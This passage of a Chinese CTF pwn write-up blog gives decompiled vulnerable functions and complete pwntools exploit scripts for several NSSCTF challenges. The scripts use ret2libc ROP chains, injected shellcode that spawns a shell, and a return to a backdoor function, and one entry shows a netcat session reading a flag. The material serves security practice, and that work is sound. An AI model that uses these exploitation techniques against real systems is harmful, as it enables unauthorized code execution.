class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">23522</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line">r()</span><br><span class="line">sl(<span class="string">&quot;%12$p%13$p%14$p%15$p%16$p%17$p&quot;</span>)</span><br><span class="line"></span><br><span class="line">s = p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">str</span> <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>) -<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">2</span>):</span><br><span class="line">        byte = <span class="built_in">str</span>[i:i+<span class="number">2</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(byte,<span class="number">16</span>)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="HNCTF-2022-Week1-ezr0p64"><a href="#HNCTF-2022-Week1-ezr0p64" class="headerlink" title="[HNCTF 2022 Week1]ezr0p64"></a>[HNCTF 2022 Week1]ezr0p64</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Gift :%p\n&quot;</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Start your rop.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现给了一个puts的地址，可以算出system和bin_sh的值，然后rop即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">22626</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rl(<span class="string">&quot;Gift :&quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;puts addr: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr,bin_sh_addr = get_sb()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">264</span></span><br><span class="line">payload = flat([cyclic(offset),ret,rdi,bin_sh_addr,system_addr])</span><br><span class="line"><span class="comment"># print(puts_addr)</span></span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="SWPUCTF-2022-新生赛-shellcode？"><a href="#SWPUCTF-2022-新生赛-shellcode？" class="headerlink" title="[SWPUCTF 2022 新生赛]shellcode？"></a>[SWPUCTF 2022 新生赛]shellcode？</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x30303000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0x30303000</span>, <span class="number">0x64</span>uLL);</span><br><span class="line">  MEMORY[<span class="number">0x30303000</span>]();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>申请权限</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">20999</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line">sh = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">sl(sh)</span><br><span class="line">inter()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="HNCTF-2022-WEEK2-ez-backdoor"><a href="#HNCTF-2022-WEEK2-ez-backdoor" class="headerlink" title="[HNCTF 2022 WEEK2]ez_backdoor"></a>[HNCTF 2022 WEEK2]ez_backdoor</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x140</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意一下栈对齐</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node4.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">28631</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&quot;ret&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">offset = <span class="number">0x100</span> + <span class="number">8</span></span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">payload = flat([cyclic(offset),ret,backdoor])</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="HUBUCTF-2022-新生赛-singout"><a href="#HUBUCTF-2022-新生赛-singout" class="headerlink" title="[HUBUCTF 2022 新生赛]singout"></a>[HUBUCTF 2022 新生赛]singout</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-&gt; % nc node5.anna.nssctf.cn 23406</span><br><span class="line">Here is your shell !,get you flag</span><br><span class="line">root@pwn:~<span class="comment"># tail *</span></span><br><span class="line">root@pwn:~<span class="comment"># sh: 1: flag.txt: not found</span></span><br><span class="line">root@pwn:~<span class="comment"># tail ./*</span></span><br><span class="line">root@pwn:~<span class="comment"># ./flag.txt: 1: ./flag.txt: NSSCTF&#123;a015c1f8-1b81-4fda-8a54-48718370d2e6&#125;: not found</span></span><br><span class="line">root@pwn:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h3 id="LitCTF-2023-狠狠的溢出涅"><a href="#LitCTF-2023-狠狠的溢出涅" class="headerlink" title="[LitCTF 2023]狠狠的溢出涅~"></a>[LitCTF 2023]狠狠的溢出涅~</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">91</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [rsp+6Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave your message:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0x50</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ok,Message Received&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现了<code>strlen</code>​存在<code>\x00</code>​截断，然后打ret2libc即可，由于91注意对齐</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span 